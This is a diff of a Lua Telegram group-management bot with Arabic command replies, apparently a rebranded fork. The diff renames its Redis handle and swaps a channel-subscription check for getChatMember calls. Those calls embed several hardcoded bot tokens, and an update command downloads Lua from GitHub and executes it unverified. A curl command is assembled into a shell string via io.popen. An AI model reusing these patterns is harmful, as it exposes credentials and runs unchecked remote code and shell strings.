 local hash =  'MohaMeD:'..bot_id..'gmuted:'
 if result.id_ then
 texts = '👤┇العضو ~⪼ ['..result.title_..'](t.me/'..(apid[2] or 'MohaMeDTEAM')..')\n🚫┇تم الغاء كتمه من المجموعات البوت'
-database:srem(hash, result.id_)
+datahmade:srem(hash, result.id_)
 else
 texts = '✖┇خطاء'
 end
@@ -2764,16 +2708,16 @@ end
 if text and text:match("^الغاء كتم العام (%d+)$") then
 local apbll = {string.match(text, "^(الغاء كتم العام) (%d+)$")}
 local hash =  'MohaMeD:'..bot_id..'gmuted:'
-database:srem(hash, apbll[2])
+datahmade:srem(hash, apbll[2])
 tsX000(apbll[2],msg,"🚫┇تم الغاء كتمه من المجموعات البوت")
 return false
 end
 ------------------------------------------------------------------------
 if text == ("اضف مطور") and msg.reply_to_message_id_ then
-local url , res = http.request('http://MohaMeD.ml/joinch/?id='..msg.sender_user_id_..'')
-data = JSON.decode(url)
-if data.Ch_Member.MohaMeD ~= true then
-send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @M1_m2s ⚜️\n', 1, 'html')   
+local res = https.request('https://api.telegram.org/bot811517309:AAHXqID4uTs4NOfcRH3WHIBd6pf353sxNmg/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @MohaMeDFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@MohaMeDfreer.MohaMeD ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @MohaMeD ⚜️\n', 1, 'html')   
 return false end
 function promote_by_reply(extra, result, success)
 if redis:sismember('MohaMeD:'..bot_id..'dev', result.sender_user_id_) then
@@ -2789,10 +2733,10 @@ return false
 end
 ------------------------------------------------------------------------
 if text and text:match("^اضف مطور @(.*)$") then
-local url , res = http.request('http://MohaMeD.ml/joinch/?id='..msg.sender_user_id_..'')
-data = JSON.decode(url)
-if data.Ch_Member.MohaMeD ~= true then
-send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @M1_m2s ⚜️\n', 1, 'html')   
+local res = https.request('https://api.telegram.org/bot811517309:AAHXqID4uTs4NOfcRH3WHIBd6pf353sxNmg/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @MohaMeDFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@MohaMeDfreer.MohaMeD ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @MohaMeD ⚜️\n', 1, 'html')   
 return false 
 end
 local apmd = {string.match(text, "^(اضف مطور) @(.*)$")}
@@ -2815,10 +2759,10 @@ return false
 end
 ------------------------------------------------------------------------
 if text and text:match("^اضف مطور (%d+)$") then
-local url , res = http.request('http://MohaMeD.ml/joinch/?id='..msg.sender_user_id_..'')
-data = JSON.decode(url)
-if data.Ch_Member.MohaMeD ~= true then
-send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @M1_m2s ⚜️\n', 1, 'html')   
+local res = https.request('https://api.telegram.org/bot811517309:AAHXqID4uTs4NOfcRH3WHIBd6pf353sxNmg/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @MohaMeDFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@MohaMeDfreer.MohaMeD ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @MohaMeD ⚜️\n', 1, 'html')   
 return false end
 local apmd = {string.match(text, "^(اضف مطور) (%d+)$")}
 redis:set('MohaMeD:'..bot_id..'sudoo'..apmd[2]..'', 'yes')
@@ -2828,10 +2772,10 @@ return false
 end
 ------------------------------------------------------------------------
 if text == ("حذف مطور") and msg.reply_to_message_id_ then
-local url , res = http.request('http://MohaMeD.ml/joinch/?id='..msg.sender_user_id_..'')
-data = JSON.decode(url)
-if data.Ch_Member.MohaMeD ~= true then
-send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @M1_m2s ⚜️\n', 1, 'html')   
+local res = https.request('https://api.telegram.org/bot811517309:AAHXqID4uTs4NOfcRH3WHIBd6pf353sxNmg/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @MohaMeDFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@MohaMeDfreer.MohaMeD ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @MohaMeD ⚜️\n', 1, 'html')   
 return false end
 function demote_by_reply(extra, result, success)
 if not redis:sismember('MohaMeD:'..bot_id..'dev', result.sender_user_id_) then
@@ -2847,10 +2791,10 @@ return false
 end
 ------------------------------------------------------------------------
 if text and text:match("^حذف مطور @(.*)$")  then
-local url , res = http.request('http://MohaMeD.ml/joinch/?id='..msg.sender_user_id_..'')
-data = JSON.decode(url)
-if data.Ch_Member.MohaMeD ~= true then
-send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @M1_m2s ⚜️\n', 1, 'html')   
+local res = https.request('https://api.telegram.org/bot811517309:AAHXqID4uTs4NOfcRH3WHIBd6pf353sxNmg/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @MohaMeDFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@MohaMeDfreer.MohaMeD ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @MohaMeD ⚜️\n', 1, 'html')   
 return false end
 local apmd = {string.match(text, "^(حذف مطور) @(.*)$")}
 function demote_by_username(extra, result, success)
@@ -2868,10 +2812,10 @@ return false
 end  
 ------------------------------------------------------------------------
 if text and text:match("^حذف مطور (%d+)$") then
-local url , res = http.request('http://MohaMeD.ml/joinch/?id='..msg.sender_user_id_..'')
-data = JSON.decode(url)
-if data.Ch_Member.MohaMeD ~= true then
-send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @M1_m2s ⚜️\n', 1, 'html')   
+local res = https.request('https://api.telegram.org/bot811517309:AAHXqID4uTs4NOfcRH3WHIBd6pf353sxNmg/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @MohaMeDFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@MohaMeDfreer.MohaMeD ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @MohaMeD ⚜️\n', 1, 'html')   
 return false end
 local apmd = {string.match(text, "^(حذف مطور) (%d+)$")}
 redis:del('MohaMeD:'..bot_id..'sudoo'..apmd[2]..'', 'no')
@@ -2888,25 +2832,25 @@ if text == ("تحديث السورس") then
 send(msg.chat_id_, msg.id_, 1, '☑┇تم التحديث', 1, 'md')
 os.execute('rm -rf ./libs/utils.lua')
 os.execute('rm -rf MohaMeD.lua')
-os.execute('cd libs;wget https://raw.githubusercontent.com/MohaMeDabas/MohaMeD/master/libs/utils.lua')
-os.execute('wget https://raw.githubusercontent.com/MohaMeDabas/MohaMeDabas/master/MohaMeD.lua')
+os.execute('cd libs;wget https://raw.githubusercontent.com/MohaMeDahmad/MohaMeD/master/libs/utils.lua')
+os.execute('wget https://raw.githubusercontent.com/MohaMeDahmad/MohaMeD/master/MohaMeD.lua')
 dofile('MohaMeD.lua')  
 return false
 end
 
 if (text and text == 'تفعيل المغادره') then
 send(msg.chat_id_, msg.id_, 1, '✔️┇تم تفعيل مغادره البوت', 1, 'md')
-database:del('MohaMeD:'..bot_id..'leave:groups')
+datahmade:del('MohaMeD:'..bot_id..'leave:groups')
 return false
 end
 if (text and text == 'تعطيل المغادره') then
 send(msg.chat_id_, msg.id_, 1, '🔌┇تم تعطيل مغادره البوت', 1, 'md')
-database:set('MohaMeD:'..bot_id..'leave:groups',true)
+datahmade:set('MohaMeD:'..bot_id..'leave:groups',true)
 return false
 end
 if text == 'توجيه للكل' and tonumber(msg.reply_to_message_id_) > 0 then  
 function fwwdmsg(taha,storm,sorc)  
-local list = database:smembers('MohaMeD:'..bot_id..'groups') 
+local list = datahmade:smembers('MohaMeD:'..bot_id..'groups') 
 for k,v in pairs(list) do  
 tdcli_function ({
 ID = "ForwardMessages",
@@ -2916,7 +2860,7 @@ message_ids_ = {[0] = storm.id_},
 disable_notification_ = 1,
 from_background_ = 1},cb or dl_cb,cmd) 
 end
-local gps = database:scard('MohaMeD:'..bot_id.."groups")  
+local gps = datahmade:scard('MohaMeD:'..bot_id.."groups")  
 local text = '🚸 ❯❯ تم ارسال توجيه الى *{ '..gps..' }* مجموعات'  
 send(msg.chat_id_, msg.id_, 1, text, 1, 'md')  
 end  
@@ -2924,34 +2868,34 @@ getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),fwwdmsg)
 end
 if text and text == "اضف تفاعل" then 
 send(msg.chat_id_, msg.id_, 1, '📥┇ارسال لان عدد الرسال الذي يجب ان يكون اكثر منه', 1, 'md')
-database:set("keko:set:ttt:p"..bot_id..msg.sender_user_id_,true)
-return "keko"
+datahmade:set("ahmad:set:ttt:p"..bot_id..msg.sender_user_id_,true)
+return "ahmad"
 end 
 if text and (text == "التفاعلات" or text == "قائمه التفاعلات" and end032 ) then 
-keko = database:smembers('keko:all:pppp:tt:'..bot_id) or 0
+ahmad = datahmade:smembers('ahmad:all:pppp:tt:'..bot_id) or 0
 text23p = '📊┇كلمات التفاعل : \n\n'
-if (not keko or not keko[1]) then 
+if (not ahmad or not ahmad[1]) then 
 send(msg.chat_id_, msg.id_, 1, "📊┇لا يوجد", 1, 'html')
-return "keko"
+return "ahmad"
 end
-for i=1, #keko do
-local tttee = database:get("keko:set:text:p"..bot_id..keko[i])
-text23p = text23p.."|"..i.."| ~⪼ "..keko[i].." | "..tttee.."\n"
+for i=1, #ahmad do
+local tttee = datahmade:get("ahmad:set:text:p"..bot_id..ahmad[i])
+text23p = text23p.."|"..i.."| ~⪼ "..ahmad[i].." | "..tttee.."\n"
 end
 send(msg.chat_id_, msg.id_, 1, text23p ,1, 'html')
 end
 if text and text == "مسح قائمه التفاعلات" then 
 send(msg.chat_id_, msg.id_, 1, "📊┇تم الحذف" ,1, 'html')
-keko = database:smembers('keko:all:pppp:tt:'..bot_id) or 0
-for i=1, #keko do
-database:del("keko:set:text:p"..bot_id..keko[i])
+ahmad = datahmade:smembers('ahmad:all:pppp:tt:'..bot_id) or 0
+for i=1, #ahmad do
+datahmade:del("ahmad:set:text:p"..bot_id..ahmad[i])
 end
-database:del('keko:all:pppp:tt:'..bot_id)
+datahmade:del('ahmad:all:pppp:tt:'..bot_id)
 end
 if text and text == "حذف تفاعل" then 
 send(msg.chat_id_, msg.id_, 1, '📥┇ارسال لان عدد الرسال الذي يجب ان يكون اكثر منه', 1, 'md')
-database:set("keko:set:ttt:p:Del"..bot_id..msg.sender_user_id_,true)
-return "keko"
+datahmade:set("ahmad:set:ttt:p:Del"..bot_id..msg.sender_user_id_,true)
+return "ahmad"
 end 
 
 if (text and text == 'حذف اسم البوت') then
@@ -2971,7 +2915,7 @@ end
 ------------------------------------------------------------------------
 if text == 'توجيه خاص' and tonumber(msg.reply_to_message_id_) > 0 then  
 function fwwdmsg(taha,storm,sorc)  
-local list = database:smembers('MohaMeD:'..bot_id.."userss")
+local list = datahmade:smembers('MohaMeD:'..bot_id.."userss")
 for k,v in pairs(list) do  
 tdcli_function ({
 ID = "ForwardMessages",
@@ -2981,7 +2925,7 @@ message_ids_ = {[0] = storm.id_},
 disable_notification_ = 1,
 from_background_ = 1},cb or dl_cb,cmd) 
 end
-local gps = database:scard('MohaMeD:'..bot_id.."userss")  
+local gps = datahmade:scard('MohaMeD:'..bot_id.."userss")  
 local text = '♻┇ تم ارسال توجيه الى *{ '..gps..' }* مشترك في الخاص'  
 send(msg.chat_id_, msg.id_, 1, text, 1, 'md')  
 end  
@@ -2989,7 +2933,7 @@ getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),fwwdmsg)
 end
 ------------------------------------------------------------------------
 if text == "تنظيف المشتركين"  then
-local pv = database:smembers('MohaMeD:'..bot_id.."userss")
+local pv = datahmade:smembers('MohaMeD:'..bot_id.."userss")
 local sendok = 0
 for i = 1, #pv do
 tdcli_function({ID='GetChat',chat_id_ = pv[i]
@@ -3001,7 +2945,7 @@ if data.ID and data.ID == "Ok"  then
 print('\27[30;33m»» THE USER IS SAVE ME ↓\n»» '..pv[i]..'\n\27[1;37m')
 else
 print('\27[30;31m»» THE USER IS BLOCK ME ↓\n»» '..pv[i]..'\n\27[1;37m')
-database:srem('MohaMeD:'..bot_id.."userss",pv[i])
+datahmade:srem('MohaMeD:'..bot_id.."userss",pv[i])
 sendok = sendok + 1
 end
 if #pv == i then 
@@ -3009,7 +2953,7 @@ if sendok == 0 then
 send(msg.chat_id_, msg.id_, 1,'🔖┇ لا يوجد مشتركين وهميين في البوت \n', 1, 'md')   
 else
 local ok = #pv - sendok
-send(msg.chat_id_, msg.id_, 1,'💠┇ عدد المشتركين الان ↫ ( '..#pv..' )\n📬┇ تم ازالة ↫ ( '..sendok..' ) من المشتركين\n📌┇ الان عدد المشتركين الحقيقي ↫ ( '..ok..' ) مشترك \n', 1, 'md')   
+send(msg.chat_id_, msg.id_, 1,'🔖┇ عدد المشتركين الان ↫ ( '..#pv..' )\n📬┇ تم ازالة ↫ ( '..sendok..' ) من المشتركين\n📌┇ الان عدد المشتركين الحقيقي ↫ ( '..ok..' ) مشترك \n', 1, 'md')   
 end
 end
 end,nil)
@@ -3019,7 +2963,7 @@ return false
 end
 ------------------------------------------------------------------------
 if text == "تنظيف الكروبات" then
-local group = database:smembers('MohaMeD:'..bot_id..'groups') 
+local group = datahmade:smembers('MohaMeD:'..bot_id..'groups') 
 local w = 0
 local q = 0
 for i = 1, #group do
@@ -3027,30 +2971,30 @@ tdcli_function({ID='GetChat',chat_id_ = group[i]
 },function(arg,data)
 if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusMember" then
 print('\27[30;34m»» THE BOT IS NOT ADMIN ↓\n»» '..group[i]..'\n\27[1;37m')
-database:srem("thsake:gog"..bot_id,group[i]) 
-database:srem('MohaMeD:'..bot_id..'pro:groups',group[i]) 
-database:srem( 'MohaMeD:'..bot_id.."groups",group[i]) 
+datahmade:srem("MohaMeDe:gog"..bot_id,group[i]) 
+datahmade:srem('MohaMeD:'..bot_id..'pro:groups',group[i]) 
+datahmade:srem( 'MohaMeD:'..bot_id.."groups",group[i]) 
 changeChatMemberStatus(group[i], bot_id, "Left")
 w = w + 1
 end
 if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusLeft" then
-database:srem("thsake:gog"..bot_id,group[i]) 
-database:srem('MohaMeD:'..bot_id..'pro:groups',group[i]) 
-database:srem( 'MohaMeD:'..bot_id.."groups",group[i]) 
+datahmade:srem("MohaMeDe:gog"..bot_id,group[i]) 
+datahmade:srem('MohaMeD:'..bot_id..'pro:groups',group[i]) 
+datahmade:srem( 'MohaMeD:'..bot_id.."groups",group[i]) 
 q = q + 1
 print('\27[30;35m»» THE BOT IS LEFT GROUP ↓\n»» '..group[i]..'\n\27[1;37m')
 end
 if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusKicked" then
-database:srem("thsake:gog"..bot_id,group[i]) 
-database:srem('MohaMeD:'..bot_id..'pro:groups',group[i]) 
-database:srem( 'MohaMeD:'..bot_id.."groups",group[i]) 
+datahmade:srem("MohaMeDe:gog"..bot_id,group[i]) 
+datahmade:srem('MohaMeD:'..bot_id..'pro:groups',group[i]) 
+datahmade:srem( 'MohaMeD:'..bot_id.."groups",group[i]) 
 q = q + 1
 print('\27[30;36m»» THE BOT IS KICKED GROUP ↓\n»» '..group[i]..'\n\27[1;37m')
 end
 if data and data.code_ and data.code_ == 400 then
-database:srem("thsake:gog"..bot_id,group[i]) 
-database:srem('MohaMeD:'..bot_id..'pro:groups',group[i]) 
-database:srem( 'MohaMeD:'..bot_id.."groups",group[i]) 
+datahmade:srem("MohaMeDe:gog"..bot_id,group[i]) 
+datahmade:srem('MohaMeD:'..bot_id..'pro:groups',group[i]) 
+datahmade:srem( 'MohaMeD:'..bot_id.."groups",group[i]) 
 w = w + 1
 end
 if #group == i then 
@@ -3078,67 +3022,65 @@ return false
 end
 ------------------------------------------------------------------------
 if text == ("تفعيل الكل") then
-local url , res = http.request('http://MohaMeD.ml/joinch/?id='..msg.sender_user_id_..'')
-data = JSON.decode(url)
-if data.Ch_Member.MohaMeD ~= true then
-send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @M1_m2s ⚜️\n', 1, 'html')   
+local res = https.request('https://api.telegram.org/bot811517309:AAHXqID4uTs4NOfcRH3WHIBd6pf353sxNmg/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @MohaMeDFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@MohaMeDfreer.MohaMeD ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @MohaMeD ⚜️\n', 1, 'html')   
 return false 
 end
-local gps = database:smembers('MohaMeD:'..bot_id.."groups") or 0
-local gps2 = database:smembers("thsake:gog"..bot_id) or 0
+local gps = datahmade:smembers('MohaMeD:'..bot_id.."groups") or 0
+local gps2 = datahmade:smembers("MohaMeDe:gog"..bot_id) or 0
 for i=1,#gps do
-database:sadd("thsake:gog"..bot_id, gps[i])
-database:set('MohaMeD:'..bot_id.."enable:"..gps[i],true)
-database:set( 'MohaMeD:'..bot_id.."charge:"..gps[i],true)
+datahmade:sadd("MohaMeDe:gog"..bot_id, gps[i])
+datahmade:set('MohaMeD:'..bot_id.."enable:"..gps[i],true)
+datahmade:set( 'MohaMeD:'..bot_id.."charge:"..gps[i],true)
 end
 send(msg.chat_id_, msg.id_, 1, '✔️┇تم تفعيل ~⪼  *{'..(#gps - #gps2)..'}*', 1, 'md')
 end
 ------------------------------------------------------------------------
 if text == ("تعطيل الكل") then
-local gps = database:smembers('MohaMeD:'..bot_id.."groups") or 0
-local gps2 = database:smembers("thsake:gog"..bot_id) or 0
+local gps = datahmade:smembers('MohaMeD:'..bot_id.."groups") or 0
+local gps2 = datahmade:smembers("MohaMeDe:gog"..bot_id) or 0
 for i=1,#gps do
-database:del("thsake:gog"..bot_id)
-database:del('MohaMeD:'..bot_id.."enable:"..gps[i])
-database:del( 'MohaMeD:'..bot_id.."charge:"..gps[i])
+datahmade:del("MohaMeDe:gog"..bot_id)
+datahmade:del('MohaMeD:'..bot_id.."enable:"..gps[i])
+datahmade:del( 'MohaMeD:'..bot_id.."charge:"..gps[i])
 end
 send(msg.chat_id_, msg.id_, 1, '🔌┇تم تعطيل ~⪼  *{'..#gps..'}*', 1, 'md')
 end
 ------------------------------------------------------------------------
 if text == ("مغادره الكل") then
-local gps = database:smembers('MohaMeD:'..bot_id.."groups") or 0
-local gps2 = database:smembers("thsake:gog"..bot_id) or 0
+local gps = datahmade:smembers('MohaMeD:'..bot_id.."groups") or 0
+local gps2 = datahmade:smembers("MohaMeDe:gog"..bot_id) or 0
 send(msg.chat_id_, msg.id_, 1, '💣┇تم مغادره ~⪼  *{'..#gps..'}*', 1, 'md')
 for i=1,#gps do
-database:del('MohaMeD:'..bot_id.."enable:"..gps[i])
+datahmade:del('MohaMeD:'..bot_id.."enable:"..gps[i])
 chat_leave(gps[i], bot_id)
 end
-database:del("thsake:gog"..bot_id)
-database:del('MohaMeD:'..bot_id.."groups")
+datahmade:del("MohaMeDe:gog"..bot_id)
+datahmade:del('MohaMeD:'..bot_id.."groups")
 end
 ------------------------------------------------------------------------
 if text == ("روابط الكروبات") then
-local gpss = database:smembers('MohaMeD:'..bot_id.."groups") or 0
+local gpss = datahmade:smembers('MohaMeD:'..bot_id.."groups") or 0
 text233 = '📊┇روابط الكروبات\n\n'
 for i=1, #gpss do
-local link = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..gpss[i]))
-if database:get('MohaMeD:'..bot_id.."group:link"..gpss[i]) then 
-text233 = text233.."|"..i.."| ~⪼ "..gpss[i].."\n ~⪼ "..(database:get('MohaMeD:'..bot_id.."group:link"..gpss[i])).."\n"
-else
-text233 = text233.."|"..i.."| ~⪼ "..gpss[i].."\n ~⪼ "..(link.result or ' لا توجد روابط ').."\n"
+local link = datahmade:get('MohaMeD:'..bot_id.."group:link"..gpss[i])
+text233 = text233.."|"..i.."| ~⪼ "..gpss[i].."\n ~⪼ "..(link or  "لا يوجد رابط").."\n"
 end
-end
-local f = io.open('MohaMeD_Links.txt', 'w')
+local f = io.open('MohaMeD.txt', 'w')
 f:write(text233)
 f:close()
-sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, './MohaMeD_Links.txt', '', nil)  
+local MohaMeDe = 'https://api.telegram.org/bot' .. token .. '/sendDocument'
+local curl = 'curl "' .. MohaMeDe .. '" -F "chat_id=' .. msg.chat_id_ .. '" -F "document=@' .. 'MohaMeD.txt' .. '"'
+io.popen(curl)
 end
 ------------------------------------------------------------------------
 if text and (text == "الكروبات المتفاعله" or text == "روابط الكروبات المتفاعله") then
-local gpss = database:smembers("thsake:good"..bot_id..os.date("%d")) or 0
+local gpss = datahmade:smembers("MohaMeDe:good"..bot_id..os.date("%d")) or 0
 text233 = '📊┇روابط الكروبات المتفاعله\n\n'
 for i=1, #gpss do
-local link = database:get('MohaMeD:'..bot_id.."group:link"..gpss[i])
+local link = datahmade:get('MohaMeD:'..bot_id.."group:link"..gpss[i])
 text233 = text233.."|"..i.."| ~⪼ "..gpss[i].."\n ~⪼ "..(link or  "لا يوجد رابط").."\n"
 end
 local f = io.open('MohaMeD.txt', 'w')
@@ -3149,49 +3091,49 @@ local curl = 'curl "' .. MohaMeDe .. '" -F "chat_id=' .. msg.chat_id_ .. '" -F "
 io.popen(curl)
 end
 if (text and text == 'تفعيل الانلاين' ) then
-database:set('key_ts'..bot_id,"yes")
+datahmade:set('key_ts'..bot_id,"yes")
 send(msg.chat_id_, msg.id_, 1, "✔️┇تم تفعيل خاصيه الازرار الشفافه", 1, 'html')
 end
 ------------------------------------------------------------------------
 if (text and text == 'تعطيل الانلاين') then
-local url , res = http.request('http://MohaMeD.ml/joinch/?id='..msg.sender_user_id_..'')
-data = JSON.decode(url)
-if data.Ch_Member.MohaMeD ~= true then
